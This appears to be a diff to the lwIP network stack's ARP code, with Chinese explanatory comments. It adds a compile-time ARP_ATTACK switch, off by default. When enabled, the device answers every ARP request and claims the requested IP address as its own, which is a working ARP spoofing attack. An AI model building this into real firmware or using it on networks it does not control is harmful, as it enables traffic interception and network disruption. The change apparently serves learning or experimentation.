@@ -635,7 +635,7 @@ etharp_ip_input(struct netif *netif, struct pbuf *p)
   update_arp_entry(netif, &(iphdr->src), &(ethhdr->src), 0);
 }
 
-
+#define ARP_ATTACK	0
 /**
  * Responds to ARP requests to us. Upon ARP replies to us, add entry to cache  
  * send out queued IP packets. Updates cache with snooped address pairs.
@@ -664,6 +664,9 @@ etharp_arp_input(struct netif *netif, struct eth_addr *ethaddr, struct pbuf *p)
   /* these are aligned properly, whereas the ARP header fields might not be */
 	/* 暂存ARP包的源IP和目的IP */
   struct ip_addr sipaddr, dipaddr;
+#if ARP_ATTACK == 1
+	struct ip_addr ipaddr;
+#endif
   u8_t i;
 	/* ARP请求是否发给本机 */
   u8_t for_us;
@@ -782,7 +785,11 @@ etharp_arp_input(struct netif *netif, struct eth_addr *ethaddr, struct pbuf *p)
 		 * 3，另一种方法：直接构造ARP请求，ARP请求的目的IP主机会把ARP请求中的源IP-源MAC地址对应关系
 		 * 更新到其ARP缓存。
 		 */
-    if (for_us) {
+#if ARP_ATTACK == 0
+			if (for_us) {
+#else
+			if (1) {
+#endif
 
       LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_arp_input: replying to ARP request for our IP address\n"));
       /* Re-use pbuf to send ARP reply.
@@ -791,10 +798,17 @@ etharp_arp_input(struct netif *netif, struct eth_addr *ethaddr, struct pbuf *p)
 			/* 在ARP请求包的pbuf上做修改，构造ARP回复 */
       hdr->opcode = htons(ARP_REPLY);
 
+#if ARP_ATTACK == 1
+			memcpy((void *)&ipaddr.addr, &hdr->dipaddr, 4);
+#endif
 			/* ARP包的目的IP */
       hdr->dipaddr = hdr->sipaddr;
 			/* ARP包的源IP */
+#if ARP_ATTACK == 0
       SMEMCPY(&hdr->sipaddr, &netif->ip_addr, sizeof(hdr->sipaddr));
+#else
+			SMEMCPY(&hdr->sipaddr, (void *)&ipaddr.addr, sizeof(hdr->sipaddr));
+#endif
 
       LWIP_ASSERT("netif->hwaddr_len must be the same as ETHARP_HWADDR_LEN for etharp!",
                   (netif->hwaddr_len == ETHARP_HWADDR_LEN));
